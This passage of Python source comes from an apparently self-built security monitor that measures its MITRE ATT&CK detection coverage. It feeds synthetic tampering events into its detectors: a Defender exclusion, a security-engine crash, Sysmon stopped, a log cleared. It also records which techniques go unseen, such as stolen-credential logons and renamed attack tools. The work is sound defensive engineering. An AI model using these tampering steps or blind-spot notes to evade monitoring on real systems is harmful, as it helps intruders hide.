_optional("T1195", probe_registry_redirect, ("toolchain",),
          lambda: _has("jarvis.collectors.host.toolchain.packaging", "registry_redirects"))
_optional("T1200", probe_hardware_addition, ("preos",),
          lambda: _has("jarvis.collectors.host.bootintegrity", "drift"))
# Package ownership is asked of dpkg; without it every module reads unowned.
_optional("T1556", probe_rogue_pam_module, ("implant",),
          lambda: _has("jarvis.collectors.persistence.implant", "unowned_pam_modules")
          and bool(__import__("shutil").which("dpkg")))
def _tamper_payload(**sources):
    """A tamper.ps1 payload with every source read cleanly, plus `sources`."""
    base = {k: {"ok": True, "events": []} for k in
            ("defender", "sysmon", "services", "system_clear", "app_crashes", "security")}
    base.update({"writers": {"ok": True, "events": []}, "autologgers": []})
    base.update({k: {"ok": True, "events": v} for k, v in sources.items()})
    return base


def probe_defender_exclusion():
    from jarvis.collectors.process import tamper
    key = r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Users\Public"
    added = {"id": 5007, "t": _WHEN,
             "msg": f"Configuration changed. Old value: \nNew value: {key} = 0x0"}
    writer = {"t": _WHEN, "id": 13, "image": r"C:\Windows\System32\reg.exe",
              "target": key, "details": "DWORD (0x00000000)"}
    out = tamper.findings(dict(_tamper_payload(defender=[added]),
                               writers={"ok": True, "events": [writer]}))
    routine = {"id": 5007, "t": _WHEN, "msg": "Configuration changed. New value: HKLM\\SOFTWARE\\"
               "Microsoft\\Windows Defender\\SpyNet\\LastMAPSFailureTimeString = 2026"}
    quiet = tamper.findings(_tamper_payload(defender=[routine]))
    hit = [f for f in out if f["severity"] == "high" and "(T1679)" in f["title"]]
    return (len(hit) == 1 and "reg.exe" in hit[0]["detail"]
            and all(f["severity"] == "ok" for f in quiet)), \
        "Defender exclusion added, attributed to the writing process; a routine setting stays quiet"


def probe_security_crash():
    from jarvis.collectors.process import tamper
    crash = {"id": 1000, "t": _WHEN, "msg": "Faulting application name: MsMpEng.exe, version: 4.18 "
             "Exception code: 0xc0000409 Fault offset: 0x1"}
    died = {"id": 7034, "t": _WHEN,
            "msg": "The Microsoft Defender Antivirus Service service terminated unexpectedly."}
    out = tamper.findings(_tamper_payload(app_crashes=[crash], services=[died]))
    started = {"id": 7036, "t": _WHEN,
               "msg": "The Microsoft Defender Antivirus Service service entered the running state."}
    quiet = tamper.findings(_tamper_payload(services=[started]))
    hit = [f for f in out if f["severity"] == "high" and "(T1687)" in f["title"]]
    return (len(hit) == 2 and all(f["severity"] == "ok" for f in quiet)), \
        "security engine crash and its service dying; a service starting stays quiet"


def probe_defenses_disabled():
    from jarvis.collectors.process import tamper
    out = tamper.findings(dict(
        _tamper_payload(sysmon=[{"id": 4, "t": _WHEN, "msg": "State: Stopped Version: 15.21"}],
                        system_clear=[{"id": 104, "t": _WHEN, "msg": "The System log file was cleared."}]),
        autologgers=[{"name": "EventLog-System", "exists": True, "start": 0, "disabled": []}]))
    boot = tamper.findings(_tamper_payload(
        sysmon=[{"id": 4, "t": _WHEN, "msg": "State: Started Version: 15.21"}],
        security=[{"id": 1100, "t": _WHEN, "msg": "The event logging service has shut down."}]))
    titles = " | ".join(f["title"] for f in out if f["severity"] == "high")
    return ("Sysmon service stopped" in titles and "System event log cleared" in titles
            and "ETW session EventLog-System disabled" in titles
            and all(f["severity"] == "ok" for f in boot)), \
        "Sysmon stopped, System log cleared, an event-log ETW session disabled; boot and shutdown stay quiet"


_optional("T1679", probe_defender_exclusion, ("evasion",),
          lambda: _has("jarvis.collectors.process.tamper", "findings"))
_optional("T1687", probe_security_crash, ("evasion",),
          lambda: _has("jarvis.collectors.process.tamper", "findings"))
_optional("T1685", probe_defenses_disabled, ("evasion",),
          lambda: _has("jarvis.collectors.process.tamper", "findings"))

# Techniques whose only detection is contextual: a discovery command is
# reported inside a burst and deliberately not alone, so a single `whoami` by
# an intruder goes unreported. Their probes still run (a broken burst rule is a
# regression), but they stay "claimed": the technique by itself is not caught.


def _context_only():
    from jarvis.collectors.telemetry import techniques
    acted = {tid for rule in techniques.RULES for tid in rule.tids}
    return frozenset(entry[0] for entry in techniques.DISCOVERY) - acted


# The hand-written probes above keep their technique; the rule table supplies
# the rest. A broken rule module costs its own techniques, not the map.
HAND_PROBES = frozenset(PROBES)     # probes of a detector other than the rule table


def _both(first, second):
    """A technique proven two ways is only as good as both: either one failing is a regression."""
    def probe():
        a_ok, a_what = first()
        b_ok, b_what = second()
        return a_ok and b_ok, a_what if b_what in a_what else f"{a_what}; {b_what}"
    return probe


CONTEXT_ONLY = frozenset()
try:
    CONTEXT_ONLY = _context_only() - set(PROBES)
    for _tid, (_probe, _jobs) in _table_probes().items():
        if _tid in PROBES:
            _hand, _hand_jobs = PROBES[_tid]
            PROBES[_tid] = (_both(_hand, _probe), tuple(dict.fromkeys(_hand_jobs + _jobs)))
        else:
            PROBES[_tid] = (_probe, _jobs)
except Exception:       # pragma: no cover - surfaced by the map's own totals
    pass

# Why a technique whose probe fires is still only claimed. Burst-only discovery
# is filled in below; the rest are judgments recorded here.
HELD = {tid: "reported only as part of a burst of discovery commands, never by itself"
        for tid in CONTEXT_ONLY}
# A successful remote logon is recorded and shown, but one made with stolen
# credentials is indistinguishable from the owner's: the event is seen, the
# abuse is not.
HELD["T1078"] = ("every successful remote logon is reported, but a stolen credential "
                 "looks the same as the owner's")
# Recognised only by the command syntax of one named attack tool. A renamed
# build, or a different tool doing the same thing, is not seen.
for _tid in ("T1550", "T1207", "T1606"):
    HELD[_tid] = "recognised only by the command syntax of named attack tools; another tool is not seen"
# A real command or after-effect is reported, but nothing has shown that the
# technique itself is caught (Jev-guided: scripts/reviews/coverage_next_advisory.py).
HELD["T1189"] = ("a browser starting a script host is reported; a compromise that stays "
                 "inside the browser is not seen")
HELD["T1563"] = "the tscon command is reported; no emulation has shown a hijack being caught"
HELD["T1484"] = ("Group Policy cmdlets are reported; this machine is in no domain, so nothing "
                 "has exercised it")
# Blind-side round (scripts/reviews/coverage_blind_advisory.py): Jev counted these as claimed.
HELD["T1571"] = ("only the port is judged, for a short list of script hosts; a payload using "
                 "its own program or an ordinary port is not seen")
HELD["T1205"] = ("a raw packet socket is the same observation as a sniffer; a filter on an "
                 "ordinary socket, or a knock sequence, is not seen")
HELD["T1687"] = ("a security product crashing or its service dying is reported; that is the "
                 "symptom MITRE's analytic watches for, and no exploit against one has been observed")
HELD["T1074"] = "an archive written to a few shared directories is reported; staging anywhere else is not seen"
HELD["T1080"] = "a copy command is reported; this machine uses no shared drive, so nothing has exercised it"
HELD["T1491"] = "a wallpaper change from a command line is reported; any other defacement is not seen"
HELD["T1678"] = "a loopback ping used as a sleep is reported; a delay inside a program is not seen"
HELD["T1497"] = "two hardware queries are reported; checks made through an API are not seen"
HELD["T1072"] = "no deployment agent is installed on this machine, so nothing has exercised it"
HELD["T1030"] = "splitting with an archive tool is reported; size limits applied inside a program are not seen"
# Removable media (scripts/reviews/coverage_media_advisory.py). No removable drive has been
# attached since these were built: the first one that is, read back, is their positive control.
HELD["T1091"] = ("a program started from a removable drive is reported; no removable drive has "
                 "been attached since this was built, so nothing has exercised it")
HELD["T1025"] = ("a copy command reading from a removable drive is reported; files dragged in "
                 "Explorer, or read by a program, are not seen")
HELD["T1052"] = ("a copy command writing to a removable drive is reported; files dragged in "
                 "Explorer, or written by a program, are not seen")
# Only techniques that have a probe are held; the rest keep whatever the map gives them.
HELD = {tid: why for tid, why in HELD.items() if tid in PROBES or tid in _context_only()}
CONTEXT_ONLY = frozenset(HELD)
# Precision probes guard against false-positive regressions; not a technique.
PRECISION = {"popular-domain filter": probe_popular_domain_not_flagged,
             "technique rule look-alikes": probe_technique_lookalikes}


def _live(store, jobs):
    from jarvis.response.reporting import score
    from jarvis.service.schedule import JOBS
    snaps = store.get_snapshots()
    now = time.time()
    return [j for j in jobs if j in JOBS and not (snaps.get(j) or {}).get("error")
            and score.freshness(snaps.get(j), JOBS[j][0], now) == "current"]


def _recorded_registry(store):
    """Registry rules whose keys this machine has been seen to log recently."""
    try:
        from jarvis.collectors.telemetry import sysmon
        known = json.loads(store.get_meta(sysmon.REGISTRY_RECORDED_META, "") or "{}")
        fresh = time.time() - sysmon.REGISTRY_RECORDED_FOR_S
        return frozenset(title for title, seen in known.items()
                         if isinstance(seen, (int, float)) and seen >= fresh)
    except Exception:
        return frozenset()


def _ways(tid, recorded=()):
    try:
        from jarvis.collectors.telemetry import techniques
        table = techniques.ways(tid, recorded)
    except Exception:
        table = 0
    return table + (1 if tid in HAND_PROBES else 0) or 1


def measure(store):
    """Build the coverage map. -> (findings, map)."""
    from jarvis.intel.gaps import COVERAGE

    catalogue = store.db.execute(
        "SELECT tid, name, tactics, platforms FROM attack_techniques").fetchall()
    techniques = [r for r in catalogue if "." not in r["tid"]
                  and any(p in (r["platforms"] or "") for p in ("Windows", "Linux"))]

    recorded = _recorded_registry(store)
    results, out = {}, []
    for tid, (probe, jobs) in PROBES.items():
        try:
            fired, what = probe()
        except Exception as exc:
            fired, what = False, f"probe raised {type(exc).__name__}: {exc}"
        results[tid] = (fired, what, _live(store, jobs), jobs)
        if not fired:
            out.append(_finding("coverage", "high", f"detection regressed: {tid}",
                                f"the probe ({what}) no longer fires in the real detector — "
                                f"this technique is not being caught", "attackmap"))
    for label, probe in PRECISION.items():
        try:
            ok, what = probe()
        except Exception as exc:
            ok, what = False, f"probe raised {type(exc).__name__}"
        if not ok:
            out.append(_finding("coverage", "high", f"false-positive guard regressed: {label}",
                                f"{what} — expected no match", "attackmap"))

    # A mapping to a technique ATT&CK has retired or split counts for nothing
    # and hides that its successors are unmapped (T1562 became T1685-T1690).
    known = {r["tid"] for r in catalogue}
    orphaned = sorted(t for t in set(PROBES) | {k for k in COVERAGE if "." not in k}
                      if known and t not in known)
    if orphaned:
        out.append(_finding(
            "coverage", "low", "coverage is mapped to techniques ATT&CK no longer lists",
            f"{', '.join(orphaned)}: retired, renamed or split upstream, so these mappings "
            f"cover nothing in the current catalogue. Map their successors on their own "
            f"evidence, or remove them.", "attackmap"))

    seen = {t for r in techniques for t in (r["tactics"] or "").split(",") if t}
    order = [t for t in TACTIC_ORDER if t in seen] + sorted(seen - set(TACTIC_ORDER))
    rows, tactics = [], {t: {"validated": 0, "claimed": 0, "blind": 0, "regressed": 0, "total": 0}
                         for t in order}
    for r in techniques:
        tid = r["tid"]
        if tid in results:
            fired, what, live, jobs = results[tid]
            if not fired:
                level, evidence = "regressed", what
            elif tid in CONTEXT_ONLY:
                level, evidence = "claimed", (
                    f"{what}; {HELD[tid]}" + ("" if live else f"; {', '.join(jobs)} not reporting"))
            elif live:
                level, evidence = "validated", f"{what}; live via {', '.join(live)}"
            else:
                level, evidence = "claimed", f"{what} fires, but {', '.join(jobs)} not reporting"
        elif tid in COVERAGE:
            level, evidence = "claimed", COVERAGE[tid]
        else:
            level, evidence = "blind", ""
        tacs = [t for t in (r["tactics"] or "").split(",") if t in tactics]
        for t in tacs:
            tactics[t][level] += 1
            tactics[t]["total"] += 1
        row = {"tid": tid, "name": r["name"], "tactics": tacs, "level": level, "evidence": evidence}
        if tid in results:
            # What the probe proved, apart from whether a collector was
            # reporting at that moment: readers that know the collectors'
            # state now (coveragemap) re-derive the level from these.
            row["fired"], row["what"] = bool(results[tid][0]), results[tid][1]
            # Separate procedures proven for it: the rules that report it, plus a
            # hand-written probe of another detector where there is one.
            row["ways"] = _ways(tid, recorded)
        rows.append(row)

    totals = {k: sum(1 for x in rows if x["level"] == k) for k in ("validated", "claimed", "regressed", "blind")}
    totals["total"] = len(rows)
    data = {"at": int(time.time()), "totals": totals, "tactics": tactics,
            "techniques": sorted(rows, key=lambda x: x["tid"])}
    store.set_meta(META, json.dumps(data))
    if totals["total"]:
        out.append(_finding(
            "coverage", "ok",
            f"ATT&CK: {totals['validated']} validated, {totals['claimed']} claimed, "
            f"{totals['blind']} blind of {totals['total']} techniques",
            "validated = the real detector fired on a probe and its collector is reporting; "
            "claimed = mapped without proof", "attackmap"))
    else:
        out.append(_finding("coverage", "low", "ATT&CK catalogue not loaded yet",
                            "the feeds job loads it monthly; the map follows", "attackmap"))
    return out, data


def latest(store):
    try:
        return json.loads(store.get_meta(META, "") or "null")
    except (TypeError, ValueError):
        return None
